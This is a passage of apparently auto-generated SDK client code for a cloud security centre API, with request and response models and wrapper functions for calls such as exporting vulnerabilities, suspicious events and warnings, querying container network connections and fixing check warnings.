  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'EnableCustomBlockRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function enableCustomBlockRecord(request: EnableCustomBlockRecordRequest): EnableCustomBlockRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return enableCustomBlockRecordWithOptions(request, runtime);
}

model ExecStrategyRequest {
  lang?: string(name='Lang'),
  strategyId?: int32(name='StrategyId'),
}

model ExecStrategyResponseBody = {
  requestId?: string(name='RequestId'),
}

model ExecStrategyResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ExecStrategyResponseBody(name='body'),
}

async function execStrategyWithOptions(request: ExecStrategyRequest, runtime: Util.RuntimeOptions): ExecStrategyResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ExecStrategy',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function execStrategy(request: ExecStrategyRequest): ExecStrategyResponse {
  var runtime = new Util.RuntimeOptions{};
  return execStrategyWithOptions(request, runtime);
}

model ExportRecordRequest {
  exportType?: string(name='ExportType'),
  lang?: string(name='Lang'),
  params?: string(name='Params'),
}

model ExportRecordResponseBody = {
  fileName?: string(name='FileName'),
  id?: long(name='Id'),
  requestId?: string(name='RequestId'),
}

model ExportRecordResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ExportRecordResponseBody(name='body'),
}

async function exportRecordWithOptions(request: ExportRecordRequest, runtime: Util.RuntimeOptions): ExportRecordResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.exportType)) {
    query['ExportType'] = request.exportType;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.params)) {
    query['Params'] = request.params;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ExportRecord',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function exportRecord(request: ExportRecordRequest): ExportRecordResponse {
  var runtime = new Util.RuntimeOptions{};
  return exportRecordWithOptions(request, runtime);
}

model ExportSuspEventsRequest {
  assetsTypeList?: [ string ](name='AssetsTypeList'),
  clusterId?: string(name='ClusterId'),
  containerFieldName?: string(name='ContainerFieldName'),
  containerFieldValue?: string(name='ContainerFieldValue'),
  currentPage?: string(name='CurrentPage'),
  dealed?: string(name='Dealed'),
  from?: string(name='From'),
  lang?: string(name='Lang'),
  levels?: string(name='Levels'),
  name?: string(name='Name'),
  pageSize?: string(name='PageSize'),
  parentEventTypes?: string(name='ParentEventTypes'),
  remark?: string(name='Remark'),
  sourceIp?: string(name='SourceIp'),
  status?: string(name='Status'),
  targetType?: string(name='TargetType'),
  timeEnd?: string(name='TimeEnd'),
  timeStart?: string(name='TimeStart'),
}

model ExportSuspEventsResponseBody = {
  fileName?: string(name='FileName'),
  id?: int32(name='Id'),
  requestId?: string(name='RequestId'),
}

model ExportSuspEventsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ExportSuspEventsResponseBody(name='body'),
}

async function exportSuspEventsWithOptions(request: ExportSuspEventsRequest, runtime: Util.RuntimeOptions): ExportSuspEventsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.assetsTypeList)) {
    query['AssetsTypeList'] = request.assetsTypeList;
  }
  if (!Util.isUnset(request.clusterId)) {
    query['ClusterId'] = request.clusterId;
  }
  if (!Util.isUnset(request.containerFieldName)) {
    query['ContainerFieldName'] = request.containerFieldName;
  }
  if (!Util.isUnset(request.containerFieldValue)) {
    query['ContainerFieldValue'] = request.containerFieldValue;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.levels)) {
    query['Levels'] = request.levels;
  }
  if (!Util.isUnset(request.name)) {
    query['Name'] = request.name;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.parentEventTypes)) {
    query['ParentEventTypes'] = request.parentEventTypes;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.status)) {
    query['Status'] = request.status;
  }
  if (!Util.isUnset(request.targetType)) {
    query['TargetType'] = request.targetType;
  }
  if (!Util.isUnset(request.timeEnd)) {
    query['TimeEnd'] = request.timeEnd;
  }
  if (!Util.isUnset(request.timeStart)) {
    query['TimeStart'] = request.timeStart;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ExportSuspEvents',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function exportSuspEvents(request: ExportSuspEventsRequest): ExportSuspEventsResponse {
  var runtime = new Util.RuntimeOptions{};
  return exportSuspEventsWithOptions(request, runtime);
}

model ExportVulRequest {
  aliasName?: string(name='AliasName'),
  attachTypes?: string(name='AttachTypes'),
  dealed?: string(name='Dealed'),
  groupId?: string(name='GroupId'),
  lang?: string(name='Lang'),
  necessity?: string(name='Necessity'),
  searchTags?: string(name='SearchTags'),
  type?: string(name='Type'),
  uuids?: string(name='Uuids'),
  vpcInstanceIds?: string(name='VpcInstanceIds'),
}

model ExportVulResponseBody = {
  fileName?: string(name='FileName'),
  id?: long(name='Id'),
  requestId?: string(name='RequestId'),
}

model ExportVulResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ExportVulResponseBody(name='body'),
}

async function exportVulWithOptions(request: ExportVulRequest, runtime: Util.RuntimeOptions): ExportVulResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.aliasName)) {
    query['AliasName'] = request.aliasName;
  }
  if (!Util.isUnset(request.attachTypes)) {
    query['AttachTypes'] = request.attachTypes;
  }
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.groupId)) {
    query['GroupId'] = request.groupId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.necessity)) {
    query['Necessity'] = request.necessity;
  }
  if (!Util.isUnset(request.searchTags)) {
    query['SearchTags'] = request.searchTags;
  }
  if (!Util.isUnset(request.type)) {
    query['Type'] = request.type;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  if (!Util.isUnset(request.vpcInstanceIds)) {
    query['VpcInstanceIds'] = request.vpcInstanceIds;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ExportVul',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function exportVul(request: ExportVulRequest): ExportVulResponse {
  var runtime = new Util.RuntimeOptions{};
  return exportVulWithOptions(request, runtime);
}

model ExportWarningRequest {
  dealed?: string(name='Dealed'),
  exportType?: string(name='ExportType'),
  isCleartextPwd?: int32(name='IsCleartextPwd'),
  isSummaryExport?: int32(name='IsSummaryExport'),
  lang?: string(name='Lang'),
  riskIds?: string(name='RiskIds'),
  riskLevels?: string(name='RiskLevels'),
  riskName?: string(name='RiskName'),
  sourceIp?: string(name='SourceIp'),
  statusList?: string(name='StatusList'),
  strategyId?: long(name='StrategyId'),
  subTypeNames?: string(name='SubTypeNames'),
  typeName?: string(name='TypeName'),
  typeNames?: string(name='TypeNames'),
  uuids?: string(name='Uuids'),
}

model ExportWarningResponseBody = {
  fileName?: string(name='FileName'),
  id?: long(name='Id'),
  requestId?: string(name='RequestId'),
}

model ExportWarningResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: ExportWarningResponseBody(name='body'),
}

async function exportWarningWithOptions(request: ExportWarningRequest, runtime: Util.RuntimeOptions): ExportWarningResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.dealed)) {
    query['Dealed'] = request.dealed;
  }
  if (!Util.isUnset(request.exportType)) {
    query['ExportType'] = request.exportType;
  }
  if (!Util.isUnset(request.isCleartextPwd)) {
    query['IsCleartextPwd'] = request.isCleartextPwd;
  }
  if (!Util.isUnset(request.isSummaryExport)) {
    query['IsSummaryExport'] = request.isSummaryExport;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.riskIds)) {
    query['RiskIds'] = request.riskIds;
  }
  if (!Util.isUnset(request.riskLevels)) {
    query['RiskLevels'] = request.riskLevels;
  }
  if (!Util.isUnset(request.riskName)) {
    query['RiskName'] = request.riskName;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.statusList)) {
    query['StatusList'] = request.statusList;
  }
  if (!Util.isUnset(request.strategyId)) {
    query['StrategyId'] = request.strategyId;
  }
  if (!Util.isUnset(request.subTypeNames)) {
    query['SubTypeNames'] = request.subTypeNames;
  }
  if (!Util.isUnset(request.typeName)) {
    query['TypeName'] = request.typeName;
  }
  if (!Util.isUnset(request.typeNames)) {
    query['TypeNames'] = request.typeNames;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'ExportWarning',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function exportWarning(request: ExportWarningRequest): ExportWarningResponse {
  var runtime = new Util.RuntimeOptions{};
  return exportWarningWithOptions(request, runtime);
}

model FindContainerNetworkConnectRequest {
  criteriaType?: string(name='CriteriaType'),
  currentPage?: long(name='CurrentPage'),
  dstNode?: {
    appName?: string(name='AppName'),
    clusterId?: string(name='ClusterId'),
    namespace?: string(name='Namespace'),
    nodeIds?: [ string ](name='NodeIds'),
    nodeType?: string(name='NodeType'),
    podName?: string(name='PodName'),
  }(name='DstNode'),
  endTime?: long(name='EndTime'),
  pageSize?: long(name='PageSize'),
  srcNode?: {
    appName?: string(name='AppName'),
    clusterId?: string(name='ClusterId'),
    namespace?: string(name='Namespace'),
    nodeIds?: [ string ](name='NodeIds'),
    nodeType?: string(name='NodeType'),
    podName?: string(name='PodName'),
  }(name='SrcNode'),
  startTime?: long(name='StartTime'),
}

model FindContainerNetworkConnectShrinkRequest {
  criteriaType?: string(name='CriteriaType'),
  currentPage?: long(name='CurrentPage'),
  dstNodeShrink?: string(name='DstNode'),
  endTime?: long(name='EndTime'),
  pageSize?: long(name='PageSize'),
  srcNodeShrink?: string(name='SrcNode'),
  startTime?: long(name='StartTime'),
}

model FindContainerNetworkConnectResponseBody = {
  connects?: [ 
    {
      dstContainer?: {
        containerId?: string(name='ContainerId'),
      }(name='DstContainer'),
      dstIp?: string(name='DstIp'),
      dstPort?: string(name='DstPort'),
      firstTime?: long(name='FirstTime'),
      id?: long(name='Id'),
      lastTime?: long(name='LastTime'),
      srcContainer?: {
        containerId?: string(name='ContainerId'),
      }(name='SrcContainer'),
      srcIp?: string(name='SrcIp'),
      srcPort?: string(name='SrcPort'),
    }
  ](name='Connects'),
  pageInfo?: {
    count?: long(name='Count'),
    currentPage?: long(name='CurrentPage'),
    pageSize?: long(name='PageSize'),
    totalCount?: long(name='TotalCount'),
  }(name='PageInfo'),
  requestId?: string(name='RequestId'),
}

model FindContainerNetworkConnectResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: FindContainerNetworkConnectResponseBody(name='body'),
}

async function findContainerNetworkConnectWithOptions(tmpReq: FindContainerNetworkConnectRequest, runtime: Util.RuntimeOptions): FindContainerNetworkConnectResponse {
  Util.validateModel(tmpReq);
  var request = new FindContainerNetworkConnectShrinkRequest{};
  OpenApiUtil.convert(tmpReq, request);
  if (!Util.isUnset(tmpReq.dstNode)) {
    request.dstNodeShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.dstNode, 'DstNode', 'json');
  }
  if (!Util.isUnset(tmpReq.srcNode)) {
    request.srcNodeShrink = OpenApiUtil.arrayToStringWithSpecifiedStyle(tmpReq.srcNode, 'SrcNode', 'json');
  }
  var query = {};
  if (!Util.isUnset(request.criteriaType)) {
    query['CriteriaType'] = request.criteriaType;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.dstNodeShrink)) {
    query['DstNode'] = request.dstNodeShrink;
  }
  if (!Util.isUnset(request.endTime)) {
    query['EndTime'] = request.endTime;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.srcNodeShrink)) {
    query['SrcNode'] = request.srcNodeShrink;
  }
  if (!Util.isUnset(request.startTime)) {
    query['StartTime'] = request.startTime;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'FindContainerNetworkConnect',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function findContainerNetworkConnect(request: FindContainerNetworkConnectRequest): FindContainerNetworkConnectResponse {
  var runtime = new Util.RuntimeOptions{};
  return findContainerNetworkConnectWithOptions(request, runtime);
}

model FixCheckWarningsRequest {
  checkParams?: string(name='CheckParams'),
  lang?: string(name='Lang'),
  riskId?: long(name='RiskId'),
  sourceIp?: string(name='SourceIp'),
  uuids?: string(name='Uuids'),
}

model FixCheckWarningsResponseBody = {
  batchId?: long(name='BatchId'),
  requestId?: string(name='RequestId'),
}

model FixCheckWarningsResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: FixCheckWarningsResponseBody(name='body'),
}

async function fixCheckWarningsWithOptions(request: FixCheckWarningsRequest, runtime: Util.RuntimeOptions): FixCheckWarningsResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkParams)) {
    query['CheckParams'] = request.checkParams;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.riskId)) {
    query['RiskId'] = request.riskId;
  }
  if (!Util.isUnset(request.sourceIp)) {
    query['SourceIp'] = request.sourceIp;
  }
  if (!Util.isUnset(request.uuids)) {
    query['Uuids'] = request.uuids;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'FixCheckWarnings',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function fixCheckWarnings(request: FixCheckWarningsRequest): FixCheckWarningsResponse {
  var runtime = new Util.RuntimeOptions{};
  return fixCheckWarningsWithOptions(request, runtime);
}

model GenerateOnceTaskRequest {
  param?: string(name='Param'),
  source?: string(name='Source'),
  taskName?: string(name='TaskName'),
  taskType?: string(name='TaskType'),
}

model GenerateOnceTaskResponseBody = {
  canCreate?: boolean(name='CanCreate'),
  collectTime?: long(name='CollectTime'),
  finishCount?: int32(name='FinishCount'),
  lastTask?: string(name='LastTask'),
  requestId?: string(name='RequestId'),
  taskId?: string(name='TaskId'),
  totalCount?: int32(name='TotalCount'),
}

model GenerateOnceTaskResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GenerateOnceTaskResponseBody(name='body'),
}

async function generateOnceTaskWithOptions(request: GenerateOnceTaskRequest, runtime: Util.RuntimeOptions): GenerateOnceTaskResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.param)) {
    query['Param'] = request.param;
  }
  if (!Util.isUnset(request.source)) {
    query['Source'] = request.source;
  }
  if (!Util.isUnset(request.taskName)) {
    query['TaskName'] = request.taskName;
  }
  if (!Util.isUnset(request.taskType)) {
    query['TaskType'] = request.taskType;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GenerateOnceTask',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function generateOnceTask(request: GenerateOnceTaskRequest): GenerateOnceTaskResponse {
  var runtime = new Util.RuntimeOptions{};
  return generateOnceTaskWithOptions(request, runtime);
}

model GetAlarmMachineCountRequest {
  from?: string(name='From'),
}

model GetAlarmMachineCountResponseBody = {
  data?: {
    machineCount?: int32(name='MachineCount'),
  }(name='Data'),
  requestId?: string(name='RequestId'),
}

model GetAlarmMachineCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetAlarmMachineCountResponseBody(name='body'),
}

async function getAlarmMachineCountWithOptions(request: GetAlarmMachineCountRequest, runtime: Util.RuntimeOptions): GetAlarmMachineCountResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.from)) {
    query['From'] = request.from;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetAlarmMachineCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getAlarmMachineCount(request: GetAlarmMachineCountRequest): GetAlarmMachineCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return getAlarmMachineCountWithOptions(request, runtime);
}

model GetAppNetworkRequest {
  clusterId?: string(name='ClusterId'),
  endTime?: long(name='EndTime'),
  startTime?: long(name='StartTime'),
}

model GetAppNetworkResponseBody = {
  appNetwork?: {
    edge?: [ 
      {
        dstNodeId?: string(name='DstNodeId'),
        dstNodeType?: string(name='DstNodeType'),
        id?: string(name='Id'),
        port?: string(name='Port'),
        srcNodeId?: string(name='SrcNodeId'),
        srcNodeType?: string(name='SrcNodeType'),
      }
    ](name='Edge'),
    namespace?: [ 
      {
        id?: string(name='Id'),
        name?: string(name='Name'),
      }
    ](name='Namespace'),
    node?: [ 
      {
        containerIds?: [ string ](name='ContainerIds'),
        id?: string(name='Id'),
        name?: string(name='Name'),
        namespaceId?: string(name='NamespaceId'),
        riskLevel?: string(name='RiskLevel'),
        type?: string(name='Type'),
      }
    ](name='Node'),
  }(name='AppNetwork'),
  requestId?: string(name='RequestId'),
}

model GetAppNetworkResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetAppNetworkResponseBody(name='body'),
}

async function getAppNetworkWithOptions(request: GetAppNetworkRequest, runtime: Util.RuntimeOptions): GetAppNetworkResponse {
  Util.validateModel(request);
  var query = OpenApiUtil.query(Util.toMap(request));
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetAppNetwork',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'GET',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getAppNetwork(request: GetAppNetworkRequest): GetAppNetworkResponse {
  var runtime = new Util.RuntimeOptions{};
  return getAppNetworkWithOptions(request, runtime);
}

model GetAssetsPropertyDetailRequest {
  biz?: string(name='Biz'),
  currentPage?: int32(name='CurrentPage'),
  itemName?: string(name='ItemName'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  remark?: string(name='Remark'),
  searchCriteriaList?: [ 
    {
      name?: string(name='Name'),
      value?: string(name='Value'),
    }
  ](name='SearchCriteriaList'),
  uuid?: string(name='Uuid'),
}

model GetAssetsPropertyDetailResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  propertys?: [ 
    {
      containerName?: string(name='ContainerName'),
      createTimestamp?: long(name='CreateTimestamp'),
      domain?: string(name='Domain'),
      filepath?: string(name='Filepath'),
      imageName?: string(name='ImageName'),
      instanceId?: string(name='InstanceId'),
      instanceName?: string(name='InstanceName'),
      internetIp?: string(name='InternetIp'),
      intranetIp?: string(name='IntranetIp'),
      ip?: string(name='Ip'),
      listenProtocol?: string(name='ListenProtocol'),
      moduleName?: string(name='ModuleName'),
      path?: string(name='Path'),
      pathMode?: string(name='PathMode'),
      pid?: string(name='Pid'),
      port?: string(name='Port'),
      processStarted?: long(name='ProcessStarted'),
      regionId?: string(name='RegionId'),
      serverType?: string(name='ServerType'),
      size?: int32(name='Size'),
      usedByCount?: int32(name='UsedByCount'),
      user?: string(name='User'),
      uuid?: string(name='Uuid'),
      webPath?: string(name='WebPath'),
    }
  ](name='Propertys'),
  requestId?: string(name='RequestId'),
}

model GetAssetsPropertyDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetAssetsPropertyDetailResponseBody(name='body'),
}

async function getAssetsPropertyDetailWithOptions(request: GetAssetsPropertyDetailRequest, runtime: Util.RuntimeOptions): GetAssetsPropertyDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.biz)) {
    query['Biz'] = request.biz;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.itemName)) {
    query['ItemName'] = request.itemName;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.remark)) {
    query['Remark'] = request.remark;
  }
  if (!Util.isUnset(request.searchCriteriaList)) {
    query['SearchCriteriaList'] = request.searchCriteriaList;
  }
  if (!Util.isUnset(request.uuid)) {
    query['Uuid'] = request.uuid;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetAssetsPropertyDetail',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getAssetsPropertyDetail(request: GetAssetsPropertyDetailRequest): GetAssetsPropertyDetailResponse {
  var runtime = new Util.RuntimeOptions{};
  return getAssetsPropertyDetailWithOptions(request, runtime);
}

model GetAssetsPropertyItemRequest {
  biz?: string(name='Biz'),
  currentPage?: int32(name='CurrentPage'),
  forceFlush?: boolean(name='ForceFlush'),
  lang?: string(name='Lang'),
  pageSize?: int32(name='PageSize'),
  searchInfo?: string(name='SearchInfo'),
  searchItem?: string(name='SearchItem'),
}

model GetAssetsPropertyItemResponseBody = {
  pageInfo?: {
    count?: int32(name='Count'),
    currentPage?: int32(name='CurrentPage'),
    pageSize?: int32(name='PageSize'),
    totalCount?: int32(name='TotalCount'),
  }(name='PageInfo'),
  propertyItems?: [ 
    {
      count?: int32(name='Count'),
      domain?: string(name='Domain'),
      moduleName?: string(name='ModuleName'),
      path?: string(name='Path'),
    }
  ](name='PropertyItems'),
  requestId?: string(name='RequestId'),
}

model GetAssetsPropertyItemResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetAssetsPropertyItemResponseBody(name='body'),
}

async function getAssetsPropertyItemWithOptions(request: GetAssetsPropertyItemRequest, runtime: Util.RuntimeOptions): GetAssetsPropertyItemResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.biz)) {
    query['Biz'] = request.biz;
  }
  if (!Util.isUnset(request.currentPage)) {
    query['CurrentPage'] = request.currentPage;
  }
  if (!Util.isUnset(request.forceFlush)) {
    query['ForceFlush'] = request.forceFlush;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  if (!Util.isUnset(request.pageSize)) {
    query['PageSize'] = request.pageSize;
  }
  if (!Util.isUnset(request.searchInfo)) {
    query['SearchInfo'] = request.searchInfo;
  }
  if (!Util.isUnset(request.searchItem)) {
    query['SearchItem'] = request.searchItem;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
    action = 'GetAssetsPropertyItem',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getAssetsPropertyItem(request: GetAssetsPropertyItemRequest): GetAssetsPropertyItemResponse {
  var runtime = new Util.RuntimeOptions{};
  return getAssetsPropertyItemWithOptions(request, runtime);
}

model GetBackupStorageCountResponseBody = {
  backupStorageCount?: {
    buyStorageByte?: long(name='BuyStorageByte'),
    ecsUsageStorageByte?: long(name='EcsUsageStorageByte'),
    overflow?: int32(name='Overflow'),
    uniUsageStorageByte?: long(name='UniUsageStorageByte'),
    usageStorageByte?: long(name='UsageStorageByte'),
  }(name='BackupStorageCount'),
  requestId?: string(name='RequestId'),
}

model GetBackupStorageCountResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetBackupStorageCountResponseBody(name='body'),
}

async function getBackupStorageCountWithOptions(runtime: Util.RuntimeOptions): GetBackupStorageCountResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetBackupStorageCount',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getBackupStorageCount(): GetBackupStorageCountResponse {
  var runtime = new Util.RuntimeOptions{};
  return getBackupStorageCountWithOptions(runtime);
}

model GetCheckConfigResponseBody = {
  cycleDays?: [ int32 ](name='CycleDays'),
  endTime?: int32(name='EndTime'),
  requestId?: string(name='RequestId'),
  standards?: [ 
    {
      id?: long(name='Id'),
      showName?: string(name='ShowName'),
      status?: string(name='Status'),
      type?: string(name='Type'),
    }
  ](name='Standards'),
  startTime?: int32(name='StartTime'),
}

model GetCheckConfigResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCheckConfigResponseBody(name='body'),
}

async function getCheckConfigWithOptions(runtime: Util.RuntimeOptions): GetCheckConfigResponse {
  var req = new OpenApi.OpenApiRequest{};
  var params = new OpenApi.Params{
    action = 'GetCheckConfig',
    version = '2018-12-03',
    protocol = 'HTTPS',
    pathname = '/',
    method = 'POST',
    authType = 'AK',
    style = 'RPC',
    reqBodyType = 'formData',
    bodyType = 'json',
  };
  return callApi(params, req, runtime);
}

async function getCheckConfig(): GetCheckConfigResponse {
  var runtime = new Util.RuntimeOptions{};
  return getCheckConfigWithOptions(runtime);
}

model GetCheckDetailRequest {
  checkId?: long(name='CheckId'),
  lang?: string(name='Lang'),
}

model GetCheckDetailResponseBody = {
  assistInfo?: {
    link?: string(name='Link'),
    type?: string(name='Type'),
    value?: string(name='Value'),
  }(name='AssistInfo'),
  description?: {
    link?: string(name='Link'),
    type?: string(name='Type'),
    value?: string(name='Value'),
  }(name='Description'),
  requestId?: string(name='RequestId'),
  solution?: {
    link?: string(name='Link'),
    type?: string(name='Type'),
    value?: string(name='Value'),
  }(name='Solution'),
}

model GetCheckDetailResponse = {
  headers: map[string]string(name='headers'),
  statusCode: int32(name='statusCode'),
  body: GetCheckDetailResponseBody(name='body'),
}

async function getCheckDetailWithOptions(request: GetCheckDetailRequest, runtime: Util.RuntimeOptions): GetCheckDetailResponse {
  Util.validateModel(request);
  var query = {};
  if (!Util.isUnset(request.checkId)) {
    query['CheckId'] = request.checkId;
  }
  if (!Util.isUnset(request.lang)) {
    query['Lang'] = request.lang;
  }
  var req = new OpenApi.OpenApiRequest{ 
    query = OpenApiUtil.query(query),
  };
  var params = new OpenApi.Params{
